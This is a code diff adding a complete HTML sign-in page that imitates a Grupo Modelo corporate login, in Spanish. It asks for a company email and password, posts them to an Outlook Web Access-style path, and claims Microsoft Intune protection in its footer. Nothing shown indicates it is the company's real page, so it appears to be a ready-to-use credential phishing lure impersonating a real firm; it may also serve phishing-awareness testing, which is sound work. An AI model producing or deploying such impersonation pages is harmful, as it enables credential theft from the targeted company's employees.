@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your account - Grupo Modelo</title>
+    <style>
+        body { background: #f2f2f2; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 2px; }
+        .logo { width: 150px; margin-bottom: 20px; font-weight: bold; color: #002d72; font-size: 24px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 10px; }
+        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #666; box-sizing: border-box; }
+        .btn { background: #0067b8; color: white; padding: 10px 30px; border: none; cursor: pointer; float: right; }
+        .footer { margin-top: 50px; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">GRUPO MODELO</div>
+        <h1>Iniciar sesión</h1>
+        <p style="font-size: 15px; margin-bottom: 20px;">Utilice su cuenta de @gmodelo.com.mx</p>
+        <form action="/owa/auth" method="POST">
+            <input type="email" placeholder="Alguien@gmodelo.com.mx" name="email">
+            <input type="password" placeholder="Contraseña" name="pass">
+            <div style="height: 40px;"><button type="submit" class="btn">Siguiente</button></div>
+        </form>
+        <div class="footer">Protegido por Microsoft Intune & Core-Security-MEX</div>
+    </div>
+</body>
+</html>
